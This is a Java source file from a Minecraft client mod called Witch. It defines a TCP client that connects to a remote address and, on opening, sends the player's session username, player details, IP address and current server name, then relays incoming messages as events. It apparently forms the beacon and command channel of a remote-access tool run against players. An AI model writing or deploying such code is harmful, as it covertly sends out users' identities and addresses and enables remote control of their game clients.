package me.soda.witch.client.connection;

import me.soda.witch.client.Witch;
import me.soda.witch.client.events.events.MessageReceiveEvent;
import me.soda.witch.client.utils.ClientPlayerInfo;
import me.soda.witch.client.utils.NetUtil;
import me.soda.witch.shared.socket.TcpClient;
import me.soda.witch.shared.socket.packet.DisconnectPacket;

import static me.soda.witch.client.Witch.mc;

public class Client extends TcpClient {
    public int reconnections = 0;

    public Client(String address) {
        super(address, 30000, true);
    }

    @Override
    public boolean onReconnect() {
        boolean tooMany = reconnections > 10;
        if (!tooMany) {
            reconnections++;
        } else {
            setReconnectTimeout(-1);
            Witch.println("Witch end because of manual shutdown or too many reconnections");
        }
        return false;
    }

    @Override
    public void onOpen() {
        Witch.println("Connection initialized");
        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
        NetUtil.send("greeting", greetingMsg);
        NetUtil.send("player", ClientPlayerInfo.getPlayerInfo());
        NetUtil.send("ip", NetUtil.getIp());
        NetUtil.send("server_name");
    }

    @Override
    public void onMessage(Object o) {
        MessageReceiveEvent.INSTANCE.post(o);
    }

    @Override
    public void onClose(DisconnectPacket packet) {
    }
}